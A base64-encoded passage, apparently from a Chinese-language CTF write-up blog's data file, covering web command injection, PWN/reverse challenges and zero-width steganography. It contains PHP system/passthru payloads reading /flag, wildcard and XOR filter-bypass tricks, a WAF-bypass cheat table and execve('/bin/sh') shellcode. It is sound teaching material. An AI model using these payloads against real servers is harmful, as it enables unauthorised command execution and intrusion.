9Y2F0XFwke0lGU30vZmxhZ1xyXG5cXGBcXGBcXGBcclxuXHJcbiMjIFx1NjVFMFx1NUI1N1x1NkJDRCBSQ0UgXHUyNjA1XHVGRjA4XHU0RTAwXHU4ODQwXHVGRjA5XHJcblxyXG5cdThGQzdcdTZFRTRcdTRFODZcdTYyNDBcdTY3MDkgYS16QS1aIFx1NUI1N1x1NkJDRFx1RkYwQ1x1NzcwQlx1OEQ3N1x1Njc2NVx1NUI4Q1x1NTE2OFx1NkNBMVx1NkNENVx1Njc4NFx1OTAyMFx1NTQ3RFx1NEVFNFx1MzAwMlx1NEY0NiBMaW51eCBcdTc2ODQgXFxgLlxcYCBcdTU0N0RcdTRFRTRcdUZGMDhcdTdCNDlcdTRFRjdcdTRFOEUgXFxgc291cmNlXFxgXHVGRjA5XHU1M0VGXHU0RUU1XHU4QkZCXHU1M0Q2XHU1RTc2XHU2MjY3XHU4ODRDXHU2NTg3XHU0RUY2XHU1MTg1XHU1QkI5XHVGRjBDXHU4MDBDXHU1QjgzXHU2NzJDXHU4RUFCXHU0RTBEXHU2NjJGXHU1QjU3XHU2QkNEXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBcclxuUE9TVCAvP2NtZD0uIC8/Pz8/Lj8/PyAyPiYxXHJcblxcYFxcYFxcYFxyXG5cclxuXFxgLz8/Pz8uPz8/XFxgIFx1NTMzOVx1OTE0RCBcXGAvZmxhZy50eHRcXGBcdUZGMENcXGAuXFxgIFx1NjI2N1x1ODg0Q1x1NjU4N1x1NEVGNlx1NTE4NVx1NUJCOVx1RkYwQ1x1OTUxOVx1OEJFRlx1NEZFMVx1NjA2Rlx1NkNDNFx1OTczMiBmbGFnXHUzMDAyXHJcblxyXG4qKlx1NTE3M1x1OTUyRVx1N0VDNlx1ODI4MioqXHVGRjFBXFxgc3lzdGVtKClcXGAgXHU1M0VBXHU2MzU1XHU4M0I3IHN0ZG91dFx1RkYwQ1x1ODAwQyBzb3VyY2UgXHU2MjY3XHU4ODRDXHU0RTBEXHU1QjU4XHU1NzI4XHU2NTg3XHU0RUY2XHU2NUY2XHU5NTE5XHU4QkVGXHU0RkUxXHU2MDZGXHU4RDcwXHU3Njg0XHU2NjJGIHN0ZGVyclx1RkYwQ1x1NUZDNVx1OTg3Qlx1NTJBMCBcXGAyPiYxXFxgIFx1NjI4QSBzdGRlcnIgXHU5MUNEXHU1QjlBXHU1NDExXHU1MjMwIHN0ZG91dCBcdTYyNERcdTgwRkRcdTc3MEJcdTUyMzAgZmxhZ1x1RkYwMVxyXG5cclxuIyMgUEhQIFx1NTFGRFx1NjU3MFx1OEMwM1x1NzUyOFx1OTRGRVxyXG5cclxuXHU1OTgyXHU2NzlDXHU5ODk4XHU3NkVFXHU2MjhBXHU1NDdEXHU0RUU0XHU2MjY3XHU4ODRDXHU1QzAxXHU4OEM1XHU1NzI4IFBIUCBcdTc2ODQgXFxgZXZhbFxcYCBcdTYyMTYgXFxgc3lzdGVtXFxgIFx1OTFDQ1x1RkYxQVxyXG5cclxuXFxgXFxgXFxgcGhwXHJcbi8vIGV6Y21kXzY6IGV2YWxcdTYyNjdcdTg4NENcclxuUE9TVCBxYz1zeXN0ZW0oXCJjYXQgL2ZsYWdcIilcclxuXHJcbi8vIGV6Y21kXzc6IFx1NTE3M1x1OTUyRVx1OEJDRFx1OEZDN1x1NkVFNFx1RkYwQ1x1NUI1N1x1N0IyNlx1NEUzMlx1NjJGQ1x1NjNBNVxyXG5QT1NUIHFjPXN5c3RlbShcImNhdCAvZmxcIi5cImFnXCIpXHJcblxyXG4vLyBlemNtZF84OiBwYXNzdGhydSArIFx1NjJGQ1x1NjNBNVxyXG5QT1NUIHFjPXBhc3N0aHJ1KFwiY2F0IC9mbFwiLlwiYWdcIilcclxuXHJcbi8vIGV6Y21kXzk6IHRhYlx1N0VENVx1OEZDN1x1N0E3QVx1NjgzQ1xyXG5QT1NUIHFjPXBhc3N0aHJ1KFwiY2F0XFxcXHQvZmxcIi5cImFnXCIpXHJcblxcYFxcYFxcYFxyXG5cclxuIyMgUEhQIFx1NkU5MFx1NzgwMVx1NkNDNFx1OTczMlxyXG5cclxuXHU3NTI4IFxcYD8+XFxgIFx1NjNEMFx1NTI0RFx1N0VEM1x1Njc1RiBQSFAgXHU2ODA3XHU3QjdFXHVGRjBDXHU1NDBFXHU5NzYyXHU3Njg0XHU1MTg1XHU1QkI5XHU0RjFBXHU4OEFCXHU1RjUzXHU2MjEwXHU3RUFGXHU2NTg3XHU2NzJDXHU3NkY0XHU2M0E1XHU4RjkzXHU1MUZBXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBcclxuR0VUIC8/cWM9cmVhZGZpbGUoJ2ZsYWcucGhwJyk/PlxyXG5cXGBcXGBcXGBcclxuXHJcblVSTCBcdTkxQ0NcdThCQjBcdTVGOTdcdTdGMTZcdTc4MDFcdTRFM0EgXFxgJTNGJTNFXFxgXHUzMDAyXHJcblxyXG4tLS1cclxuXHJcbiMjIFx1N0VENVx1OEZDN1x1OTAxRlx1NjdFNVx1ODg2OFx1RkYwOFx1NjZGNFx1NjVCMFx1NzI0OFx1RkYwOVxyXG5cclxufCBcdThGQzdcdTZFRTRcdTk4NzkgfCBcdTdFRDVcdThGQzdcdTY1QjlcdTZDRDUgfFxyXG58LS0tLS0tLS18LS0tLS0tLS0tfFxyXG58IFx1N0E3QVx1NjgzQyB8IFxcYFxcJHtJRlN9XFxgLCBcXGA8XFxgLCBcXGB7Y2F0LC9mbGFnfVxcYCwgdGFiIHxcclxufCBcdTUxNzNcdTk1MkVcdThCQ0RcdTYyRkNcdTYzQTUgfCBcXGBcImZsXCIuXCJhZ1wiXFxgLCBcXGAnZmwnLidhZydcXGAgfFxyXG58IFx1NjVFMFx1NUI1N1x1NkJDRFJDRSB8IFxcYC4gLz8/Pz8uPz8/IDI+JjFcXGAgKHNvdXJjZVx1NkNDNFx1OTczMikgfFxyXG58IFx1NjU3MFx1NUI1NytcdTVCNTdcdTZCQ0RcdTUxNjhcdThGQzdcdTZFRTQgfCBYT1IgXHU2Nzg0XHU5MDIwXHU1QjU3XHU3QjI2IHxcclxufCBzeXN0ZW0vZXhlYyB8IHBhc3N0aHJ1LCBzaGVsbF9leGVjLCBwcm9jX29wZW4gfFxyXG58IFx1OEY5M1x1NTFGQVx1OTFDRFx1NUI5QVx1NTQxMSB8IFxcYDsjXFxgIFx1NkNFOFx1OTFDQVx1NTQwRVx1OTc2MiB8XHJcblxyXG4jIyBYT1IgXHU2Nzg0XHU5MDIwXHU1QjU3XHU3QjI2XHU0RTMyXHU2MjgwXHU1REU3XHJcblxyXG5cdTVGNTMgV0FGIFx1OEZERVx1NUI1N1x1NkJDRFx1NjU3MFx1NUI1N1x1OTBGRFx1OEZDN1x1NkVFNFx1NjVGNlx1RkYwQ1x1NTNFRlx1NEVFNVx1NzUyOCBYT1IgXHU4RkQwXHU3Qjk3XHU3QjI2XHU0RUNFXHU1M0VGXHU3NTI4XHU1QjU3XHU3QjI2XHU0RTJEXHU2MkZDXHU1MUZBXHU3NkVFXHU2ODA3XHU1QjU3XHU3QjI2XHU0RTMyXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBwaHBcclxuIyBcdTc2RUVcdTY4MDc6IFx1Njc4NFx1OTAyMCBcInN5c3RlbVwiXHJcbiMgXHU3NTI4IFhPUiBcdTRFQ0VcdTRFMjRcdTRFMkFcdTk3NUVcdTVCNTdcdTZCQ0RcdTVCNTdcdTdCMjZcdTYyRkNcdTUxRkFcdTVCNTdcdTZCQ0RcclxuJF9fID0gKFwiX1wiXlwiXFxcXFwiKTsgICAvLyBcIl9cIiBeIFwiXFxcXFwiID0gXCJzXCJcclxuIyBcdTdFRTdcdTdFRUQgWE9SIFx1OTRGRVx1NjJGQ1x1NTFGQVx1NUI4Q1x1NjU3NFx1NTFGRFx1NjU3MFx1NTQwRFxyXG4kXyhcImNhdCAvZmwqXCIpO1xyXG5cXGBcXGBcXGBcclxuXHJcbioqXHU1MzlGXHU3NDA2KipcdUZGMUFcdTVCNTdcdTdCMjZcdTc2ODQgQVNDSUkgXHU1MDNDXHU3RUNGXHU4RkM3IFhPUiBcdThGRDBcdTdCOTdcdTU0MEVcdTUzRUZcdTgwRkRcdTVGOTdcdTUyMzBcdTRFRkJcdTYxMEZcdTVCNTdcdTZCQ0RcdTMwMDJcdTUxNzNcdTk1MkVcdTY2MkZcdTYyN0VcdTUyMzAgV0FGIFx1NjUzRVx1ODg0Q1x1NzY4NFx1NUI1N1x1N0IyNlx1N0VDNFx1NTQwOFx1MzAwMlx1NTNDMlx1ODAwM1x1RkYxQVtwaHAtY2hhcnMteG9yXShodHRwczovL2dpdGh1Yi5jb20veW1ndmUvcGhwLWNoYXJzLXhvcilcclxuXHJcbi0tLVxyXG5cclxuKipcdThFMjlcdTU3NTFcdTY1NTlcdThCQUQqKlx1RkYxQVxyXG4xLiBcXGAyPiYxXFxgIFx1OEZEOVx1NEUyQSBzdGRlcnIgXHU5MUNEXHU1QjlBXHU1NDExXHU2NjJGXHU3NzFGXHU2QjYzXHU3Njg0XHU2NzQwXHU2MjRCXHU5NTBGXHVGRjBDXHU1OTdEXHU1MUUwXHU2QjIxXHU2MjExXHU2MkZGXHU1MjMwXHU0RTg2IHBheWxvYWQgXHU1Mzc0XHU3NzBCXHU0RTBEXHU1MjMwIGZsYWdcdUZGMENcdTVDMzFcdTY2MkZcdTVGRDhcdTRFODZcdTUyQTBcdTVCODNcclxuMi4gXHU2NUUwXHU1QjU3XHU2QkNEXHU1NzNBXHU2NjZGXHU1MjJCXHU2QjdCXHU3OEQ1XHU1QjU3XHU2QkNEXHVGRjBDXFxgLlxcYFx1MzAwMVxcYCQoKVxcYFx1MzAwMVx1OTAxQVx1OTE0RFx1N0IyNlx1OTBGRFx1NjYyRlx1OTc1RVx1NUI1N1x1NkJDRFx1NzY4NFx1NTNFRlx1NzUyOFx1OEQ0NFx1NkU5MFxyXG4zLiBQSFAgXHU3Njg0IFxcYD8+XFxgIFx1OTVFRFx1NTQwOFx1NjgwN1x1N0I3RVx1NjI4MFx1NURFN1x1NUY4OFx1NUJCOVx1NjYxM1x1ODhBQlx1NUZGRFx1NzU2NVx1RkYwQ1x1NUI4M1x1NjcyQ1x1OEQyOFx1NEUwQVx1NjYyRlx1NTcyOFx1NTIyOVx1NzUyOCBQSFAgXHU3Njg0XHU2REY3XHU3RjE2XHU2NzNBXHU1MjM2XHJcbmBcclxuICB9LFxyXG4gIHB3bjoge1xyXG4gICAgdGl0bGU6ICdQV04gXHU0RTBFXHU5MDA2XHU1NDExJyxcclxuICAgIHN1YnRpdGxlOiAnUFdOICYgUmV2ZXJzZSBFbmdpbmVlcmluZycsXHJcbiAgICBjb250ZW50OiBgXHJcblx1OEZEOVx1NkIyMVx1Njc2NVx1ODA0QVx1ODA0QSBDVEYgXHU0RTJEXHU0RTI0XHU0RTJBXHU2NzAwXCJcdTc4NkNcdTY4MzhcIlx1NzY4NFx1NjVCOVx1NTQxMVx1MjAxNFx1MjAxNFBXTiBcdTU0OENcdTkwMDZcdTU0MTFcdTMwMDJcdTYyMTFcdTYzMTFcdTRFODZcdTRFMDlcdTkwNTNcdTY3MDlcdTYxMEZcdTYwMURcdTc2ODRcdTk4OThcdTc2RUVcdUZGMENcdTk2QkVcdTVFQTZcdTRFQ0VcdTdCODBcdTUzNTVcdTUyMzBcdTU2RjBcdTk2QkVcdTkwRkRcdTY3MDlcdTg5ODZcdTc2RDZcdTMwMDJcclxuXHJcbiMjIFgwciBcdTIwMTQgXHU5MDA2XHU1NDExXHU0RTJEXHU3Njg0XHU2NTcwXHU2MzZFXHU2M0QwXHU1M0Q2XHJcblxyXG5cdTdFRDlcdTRFODZcdTRFMDBcdTRFMkEgRUxGIGJpbmFyeVx1RkYwQ1x1NzUyOCBJREEgXHU2MjUzXHU1RjAwXHU0RTAwXHU3NzBCXHVGRjBDXHU2ODM4XHU1RkMzXHU5MDNCXHU4RjkxXHU1QzMxXHU2NjJGXHU0RTI0XHU1QzQyIFhPUlx1MzAwMlx1NTE0OFx1NjI4QVx1NjU3MFx1NjM2RVx1NjNEMFx1NTNENlx1NTFGQVx1Njc2NVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbmNpcGhlciA9IFsweDYxLCAweDZlLCAweDc1LCAweDYwLCAweDc5LCAweDZkLCAweDM3LCAweDc3LFxyXG4gICAgICAgICAgMHg0YiwgMHg0YywgMHg2YywgMHgyNCwgMHg1MCwgMHg1ZCwgMHg3NiwgMHgzMyxcclxuICAgICAgICAgIDB4NzEsIDB4MjUsIDB4NDQsIDB4NWQsIDB4NmMsIDB4NDgsIDB4NzAsIDB4NjldXHJcbmtleTEgPSBbMHgxNCwgMHgxMSwgMHg0NV1cclxua2V5MiA9IFsweDEzLCAweDEzLCAweDUxXVxyXG5mbGFnID0gJycuam9pbihjaHIoKGMgXiBrZXkxW2klM10pIF4ga2V5MltpJTNdKSBmb3IgaSwgYyBpbiBlbnVtZXJhdGUoY2lwaGVyKSlcclxuIyBmbGFne3kwdV9LbjBXX2I0czFDX3hPcn1cclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1OEUyOVx1NTc1MSoqXHVGRjFBXHU0RUNFXHU1M0NEXHU2QzQ3XHU3RjE2XHU2M0QwXHU1M0Q2XHU1QkM2XHU2NTg3XHU2NUY2XHVGRjBDXHU3QjJDIDQgXHU1QjU3XHU4MjgyXHU2MjExXHU2Mjg0XHU2MjEwXHU0RTg2IDB4NjBcdUZGMENcdTgwMENcdTVCOUVcdTk2NDVcdTVFOTRcdThCRTVcdTY2MkYgMHg3OVx1MzAwMlx1N0VEM1x1Njc5Q1x1ODlFM1x1NUJDNlx1NTFGQVx1Njc2NVx1N0IyQ1x1NEUwMFx1NEY0RFx1NEUwRFx1NjYyRiBcXGBnXFxgIFx1ODAwQ1x1NjYyRiBcXGB+XFxgXHUzMDAyXHU1MDVBXHU5MDA2XHU1NDExXHU3Njg0XHU2NUY2XHU1MDE5XHVGRjBDKipcdTY1NzBcdTYzNkVcdTYzRDBcdTUzRDZcdTRFMDBcdTVCOUFcdTg5ODFcdTRFRDRcdTdFQzYqKlx1RkYwMVxyXG5cclxuIyMgUHduJ3MgRG9vciBcdTIwMTQgXHU5MDA2XHU1NDExXHU1QkM2XHU3ODAxXHU3Qjk3XHU2Q0Q1XHJcblxyXG5cdThGRDlcdTkwNTNcdTk4OThcdTY2RjRcdTdCODBcdTUzNTVcdUZGMENiaW5hcnkgXHU5MUNDIHNjYW5mIFx1OEJGQlx1NTNENlx1NEU4Nlx1NEUwMFx1NEUyQVx1NjU3NFx1NjU3MFx1RkYwQ1x1NzEzNlx1NTQwRVx1NTQ4QyAweDZiNjU3OSBcdTUwNUFcdTZCRDRcdThGODNcdUZGMUFcclxuXHJcblxcYFxcYFxcYFxyXG4weDZiNjU3OSA9ICdrJyArICdlJyArICd5JyBcdTIxOTIgXHU1MzQxXHU4RkRCXHU1MjM2IDcwMzgzMjlcclxuXFxgXFxgXFxgXHJcblxyXG5cdThGREVcdTYzQTVcdTY3MERcdTUyQTFcdTU2NjhcdTc2ODQgOTk5OSBcdTdBRUZcdTUzRTNcdUZGMENcdThGOTNcdTUxNjVcdThGRDlcdTRFMkFcdTY1NzBcdTVCNTdcdUZGMUFcclxuXHJcblxcYFxcYFxcYFxyXG5mbGFnezY1NTFmZmIxLWYzZjItNDJkMi1iZGM3LTg2ZWM1ZDJmMmNjYX1cclxuXFxgXFxgXFxgXHJcblxyXG4jIyBpbnB1dF9mdW5jdGlvbiBcdTIwMTQgU2hlbGxjb2RlIFx1N0YxNlx1NTE5OSBcdTI2MDVcdUZGMDhcdTRFMDBcdTg4NDBcdUZGMDlcclxuXHJcblx1OTFDRFx1NTkzNFx1NjIwRlx1Njc2NVx1NEU4Nlx1MzAwMlx1OEZEOVx1OTA1M1x1OTg5OFx1ODAwM1x1NzY4NFx1NjYyRlx1NzcxRlx1NkI2M1x1NzY4NCBQV04gXHU2ODM4XHU1RkMzXHVGRjFBc2hlbGxjb2RlIFx1N0YxNlx1NTE5OVx1MzAwMlxyXG5cclxuXHU3QTBCXHU1RThGXHU5MDNCXHU4RjkxXHU2NzgxXHU3QjgwXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBjXHJcbnZvaWQgKm1lbSA9IG1tYXAoMCwgMHgxMDAwLCBQUk9UX1JFQUR8UFJPVF9XUklURXxQUk9UX0VYRUMsIC4uLik7XHJcbnJlYWQoMCwgbWVtLCAweDEwMDApO1xyXG4oKHZvaWQoKikoKSltZW0pKCk7ICAvLyBcdTc2RjRcdTYzQTVcdTYyNjdcdTg4NENcdTc1MjhcdTYyMzdcdThGOTNcdTUxNjVcdUZGMDFcclxuXFxgXFxgXFxgXHJcblxyXG5cdTc2RjRcdTYzQTVcdTUyMDZcdTkxNERcdTRFODZcdTRFMDBcdTU3NTcgUldYIFx1NTE4NVx1NUI1OFx1RkYwQ1x1NzEzNlx1NTQwRVx1NjI4QVx1OEY5M1x1NTE2NVx1NzY4NFx1NTE4NVx1NUJCOVx1NUY1M1x1NjIxMFx1NEVFM1x1NzgwMVx1NjI2N1x1ODg0Q1x1MjAxNFx1MjAxNFx1N0VDRlx1NTE3OFx1NzY4NCBzaGVsbGNvZGUgXHU2MjY3XHU4ODRDXHU1NzNBXHU2NjZGXHUzMDAyXHJcblxyXG5cdTYyMTFcdTc2ODRcdTc2RUVcdTY4MDdcdTY2MkZcdTUxOTlcdTRFMDBcdTRFMkEgMjMgXHU1QjU3XHU4MjgyXHU3Njg0IFxcYGV4ZWN2ZShcIi9iaW4vc2hcIilcXGAgc2hlbGxjb2RlXHUzMDAyXHU3Q0ZCXHU3RURGXHU4QzAzXHU3NTI4XHU1M0Y3IDU5XHVGRjBDXHU1M0MyXHU2NTcwXHU1RTAzXHU1QzQwXHVGRjFBcmF4PTU5XHVGRjBDcmRpPVx1NUI1N1x1N0IyNlx1NEUzMlx1NTczMFx1NTc0MFx1RkYwQ3JzaT0wXHVGRjBDcmR4PTBcdTMwMDJcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5zaGVsbGNvZGUgPSBieXRlcyhbXHJcbiAgICAweDQ4LDB4MzEsMHhmNiwgICAgICAgICAgICAgICAgICAgICAgICAgIyB4b3IgcnNpLCByc2lcclxuICAgIDB4NTYsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwdXNoIHJzaVxyXG4gICAgMHg0OCwweGJmLCAweDJmLDB4NjIsMHg2OSwweDZlLCAgICAgICAgICMgbW92YWJzIHJkaSwgXCIvYmluLy9zaFwiXHJcbiAgICAweDJmLDB4MmYsMHg3MywweDY4LFxyXG4gICAgMHg1NywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHB1c2ggcmRpXHJcbiAgICAweDU0LCAweDVmLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHVzaCByc3A7IHBvcCByZGlcclxuICAgIDB4NmEsMHgzYiwgMHg1OCwgICAgICAgICAgICAgICAgICAgICAgICAgIyBwdXNoIDU5OyBwb3AgcmF4XHJcbiAgICAweDk5LCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgY2RxIChyZHg9MClcclxuICAgIDB4MGYsMHgwNSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzeXNjYWxsXHJcbl0pXHJcblxcYFxcYFxcYFxyXG5cclxuXHU3RUM2XHU4MjgyXHU1NzI4XHU0RThFIFwiL2Jpbi8vc2hcIiBcdTc1MjhcdTRFODZcdTRFMjRcdTRFMkFcdTY1OUNcdTY3NjBcdTUxRDFcdTlGNTAgOCBcdTVCNTdcdTgyODJcdTVCRjlcdTlGNTBcdTMwMDJcdTUzOEJcdTY4MDhcdTU0MEVcdTc1MjggXFxgcHVzaCByc3A7IHBvcCByZGlcXGAgXHU1REU3XHU1OTk5XHU1NzMwXHU2MjhBXHU1QjU3XHU3QjI2XHU0RTMyXHU1NzMwXHU1NzQwXHU1M0Q2XHU1MUZBXHU2NzY1XHUzMDAyXHJcblxyXG5cXGBcXGBcXGBcclxuZmxhZ3sxODc0NGJmZi0zMjkyLTQ3YjMtOWY3NC01NGE4ZTRiN2Y3Mzh9XHJcblxcYFxcYFxcYFxyXG5cclxuLS0tXHJcblxyXG4qKlx1NjAzQlx1N0VEMyoqXHVGRjFBXHU4RkQ5XHU0RTA5XHU5MDUzXHU5ODk4XHU0RUUzXHU4ODY4XHU0RTg2IENURiBcdTRFMkQgUFdOIFx1NTQ4Q1x1OTAwNlx1NTQxMVx1NzY4NFx1NTE3OFx1NTc4Qlx1NjAxRFx1OERFRlx1RkYxQVx1NjU3MFx1NjM2RVx1NjNEMFx1NTNENlx1NEUwRVx1N0I5N1x1NkNENVx1OTAwNlx1NTQxMVx1MzAwMVx1NTM0Rlx1OEJBRVx1NEVBNFx1NEU5Mlx1MzAwMVx1NEVFNVx1NTNDQVx1NUU5NVx1NUM0MiBzaGVsbGNvZGUgXHU3RjE2XHU1MTk5XHUzMDAyXHU2QkNGXHU5MDUzXHU5ODk4XHU5MEZEXHU0RTBEXHU3Qjk3XHU1OTBEXHU2NzQyXHVGRjBDXHU0RjQ2XHU2MkZDXHU1NzI4XHU0RTAwXHU4RDc3XHVGRjBDXHU2QjYzXHU1OTdEXHU4OTg2XHU3NkQ2XHU0RTg2XHU4RkQ5XHU0RTJBXHU2NUI5XHU1NDExXHU0RUNFXHU1MTY1XHU5NUU4XHU1MjMwXHU4RkRCXHU5NjM2XHU3Njg0XHU2ODM4XHU1RkMzXHU2MjgwXHU4MEZEXHUzMDAyXHJcbmBcclxuICB9LFxyXG4gIHN0ZWdvOiB7XHJcbiAgICB0aXRsZTogJ1x1OTY5MFx1NTE5OVx1NjcyRlx1NEUwRVx1NTJBMFx1NUJDNicsXHJcbiAgICBzdWJ0aXRsZTogJ1N0ZWdhbm9ncmFwaHkgJiBDcnlwdG9ncmFwaHknLFxyXG4gICAgY29udGVudDogYFxyXG5cdTk2OTBcdTUxOTlcdTY3MkZcdTc2ODRcdTY4MzhcdTVGQzNcdTYwMURcdTYwRjNcdTY2MkYqKlx1OEJBOVx1NzlEOFx1NUJDNlx1NzcwQlx1OEQ3N1x1Njc2NVx1NEUwRFx1NTBDRlx1NzlEOFx1NUJDNioqXHUzMDAyXHU4RkQ5XHU2QjIxXHU2MjExXHU5MDQ3XHU1MjMwXHU0RTg2XHU0RTA5XHU3OUNEXHU0RTBEXHU1NDBDXHU3Njg0XHU5NjkwXHU1MTk5XHU5ODk4XHVGRjFBXHU5NkY2XHU1QkJEXHU1QjU3XHU3QjI2XHUzMDAxRVhJRiBcdTU2RkVcdTcyNDdcdTk2OTBcdTUxOTlcdTMwMDFcdTRFRTVcdTUzQ0EgWklQIFx1NTkxQVx1OTFDRFx1NUJDNlx1NzgwMVx1NzgzNFx1ODlFM1x1MzAwMlxyXG5cclxuIyMgXHU5NkY2XHU1QkJEXHU1QjU3XHU3QjI2XHU5NjkwXHU1MTk5XHVGRjA4WmVyby1XaWR0aCBTdGVnYW5vZ3JhcGh5XHVGRjA5XHJcblxyXG5cdTk2RjZcdTVCQkRcdTVCNTdcdTdCMjZcdTY2MkYgVW5pY29kZSBcdTRFMkQqKlx1NzcwQlx1NEUwRFx1ODlDMVx1NEU1Rlx1NjI1M1x1NEUwRFx1NTFGQVx1Njc2NSoqXHU3Njg0XHU3Mjc5XHU2QjhBXHU1QjU3XHU3QjI2XHUzMDAyXHU1QjgzXHU0RUVDXHU1NzI4XHU1QzRGXHU1RTU1XHU0RTBBXHU0RTBEXHU1MzYwXHU0RUZCXHU0RjU1XHU0RjREXHU3RjZFXHVGRjBDXHU0RjQ2XHU2NTg3XHU2NzJDXHU5MUNDXHU3ODZFXHU1QjlFXHU1QjU4XHU1NzI4XHUzMDAyXHJcblxyXG5cdTVFMzhcdTg5QzFcdTk2RjZcdTVCQkRcdTVCNTdcdTdCMjZcdUZGMUFcclxuXHJcbnwgVW5pY29kZSB8IFx1NTQwRFx1NzlGMCB8IFx1N0YyOVx1NTE5OSB8XHJcbnwtLS0tLS0tLS18LS0tLS0tfC0tLS0tLXxcclxufCBVKzIwMEMgfCBcdTk2RjZcdTVCQkRcdTk3NUVcdThGREVcdTYzQTVcdTdCMjYgfCBaV05KIHxcclxufCBVKzIwMEQgfCBcdTk2RjZcdTVCQkRcdThGREVcdTYzQTVcdTdCMjYgfCBaV0ogfFxyXG58IFUrMjAyQyB8IFx1NUYzOVx1NTFGQVx1NjVCOVx1NTQxMVx1NjgzQ1x1NUYwRlx1NTMxNiB8IFBERiB8XHJcbnwgVStGRUZGIHwgXHU5NkY2XHU1QkJEXHU5NzVFXHU2NUFEXHU3QTdBXHU2ODNDL0JPTSB8IEJPTSB8XHJcblxyXG4qKlx1N0YxNlx1NzgwMVx1NTM5Rlx1NzQwNioqXHVGRjFBXHU3NTI4IDQgXHU3OUNEXHU5NkY2XHU1QkJEXHU1QjU3XHU3QjI2XHVGRjBDXHU2QkNGXHU3OUNEXHU3RjE2XHU3ODAxIDIgXHU0RjREXHUzMDAyXHJcblxyXG5cXGBcXGBcXGBcclxuWldOSiA9IDAwXHJcblpXSiAgPSAwMVxyXG5QREYgID0gMTBcclxuQk9NICA9IDExXHJcblxcYFxcYFxcYFxyXG5cclxuIyMjIFx1NUI5RVx1NjIxOFx1RkYxQWtleTMuZG9jeCBcdTRFMkRcdTc2ODRcdTk2OTBcdTg1Q0ZcdTRGRTFcdTYwNkZcclxuXHJcbmtleTMuZG9jeCBcdTUxNzZcdTVCOUVcdTY2MkZcdTRFMkEgWklQIFx1NTM4Qlx1N0YyOVx1NTMwNVx1MzAwMlx1ODlFM1x1NTM4Qlx1NTQwRVx1NTcyOCBcXGBkb2NQcm9wcy9jb3JlLnhtbFxcYCBcdTc2ODQgXFxgPGRjOmRlc2NyaXB0aW9uPlxcYCBcdTVCNTdcdTZCQjVcdTkxQ0NcdTYyN0VcdTUyMzBcdTU5MjdcdTkxQ0ZcdTk2RjZcdTVCQkRcdTVCNTdcdTdCMjZcdUZGMUFcclxuXHJcblxcYFxcYFxcYHhtbFxyXG48ZGM6ZGVzY3JpcHRpb24+XHJcbiAgJiN4MjAwQzsmI3gyMDBDOyYjeDIwMEM7JiN4MjAwQzsmI3gyMDBEOyYjeDIwMkM7JiN4MjAyQzsmI3hGRUZGO1xyXG4gICZsdDshLS0ga2V5XHU0RjFBXHU1NzI4XHU4RkQ5XHU5MUNDXHU1NDE3XHVGRjFGLS0mZ3Q7XHJcbjwvZGM6ZGVzY3JpcHRpb24+XHJcblxcYFxcYFxcYFxyXG5cclxuXFxgJmx0OyEtLSBrZXlcdTRGMUFcdTU3MjhcdThGRDlcdTkxQ0NcdTU0MTdcdUZGMUYtLSZndDtcXGAgXHU2NjJGXHU5NjlDXHU3NzNDXHU2Q0Q1XHUzMDAyXHU3NzFGXHU2QjYzXHU3Njg0XHU2NTcwXHU2MzZFXHU4NUNGXHU1NzI4XHU1MjREXHU5NzYyIDY0IFx1NEUyQVx1OTZGNlx1NUJCRFx1NUI1N1x1N0IyNlx1OTFDQ1x1MzAwMlxyXG5cclxuKipcdTg5RTNcdTc4MDFcdTZCNjVcdTlBQTQqKlx1RkYxQVxyXG5cclxuMS4gXHU2M0QwXHU1M0Q2XHU1MTY4XHU5MEU4XHU5NkY2XHU1QkJEXHU1QjU3XHU3QjI2XHVGRjA4XHU1MTcxIDY0IFx1NEUyQVx1RkYwOVxyXG4yLiBcdTY3RTVcdTg4NjhcdThGNkNcdTRFOENcdThGREJcdTUyMzZcdUZGMUFcdTZCQ0ZcdTRFMkFcdTVCNTdcdTdCMjZcdThGNkMgMiBcdTRGNERcclxuMy4gNjQgXHUwMEQ3IDIgPSAxMjggXHU0RjREID0gMTYgXHU1QjU3XHU4MjgyXHJcbjQuIFx1NjMwOSBVVEYtMTZCRSBcdTg5RTNcdTc4MDFcdUZGMDhcdTZCQ0ZcdTVCNTdcdTgyODJcdTUyNERcdTY3MDlcdTRFMkEgXFxgXFxcXHgwMFxcYFx1RkYwOVxyXG5cclxuXFxgXFxgXFxgcHl0aG9uXHJcbmltcG9ydCB6aXBmaWxlLCByZVxyXG5cclxud2l0aCB6aXBmaWxlLlppcEZpbGUoJ2tleTMuZG9jeCcpIGFzIHo6XHJcbiAgICBjb3JlID0gei5yZWFkKCdkb2NQcm9wcy9jb3JlLnhtbCcpLmRlY29kZSgndXRmLTgnKVxyXG4gICAgZGVzYyA9IHJlLnNlYXJjaChyJzxkYzpkZXNjcmlwdGlvbj4oW148XSopPC9kYzpkZXNjcmlwdGlvbj4nLCBjb3JlKS5ncm91cCgxKVxyXG5cclxuendfbWFwID0geydcXFxcdTIwMGMnOiAnMDAnLCAnXFxcXHUyMDBkJzogJzAxJywgJ1xcXFx1MjAyYyc6ICcxMCcsICdcXFxcdWZlZmYnOiAnMTEnfVxyXG5iaXRzID0gJycuam9pbih6d19tYXBbY10gZm9yIGMgaW4gZGVzYyBpZiBjIGluIHp3X21hcClcclxudGV4dCA9ICcnXHJcbmZvciBpIGluIHJhbmdlKDAsIGxlbihiaXRzKSwgOCk6XHJcbiAgICBieXRlID0gaW50KGJpdHNbaTppKzhdLCAyKVxyXG4gICAgaWYgYnl0ZSAhPSAwOlxyXG4gICAgICAgIHRleHQgKz0gY2hyKGJ5dGUpXHJcbiMgdGV4dCA9IFwia2V5Mzo2NjZcIlxyXG5cXGBcXGBcXGBcclxuXHJcblx1ODlFM1x1NzgwMVx1N0VEM1x1Njc5Q1x1RkYxQSoqXFxga2V5Mzo2NjZcXGAqKl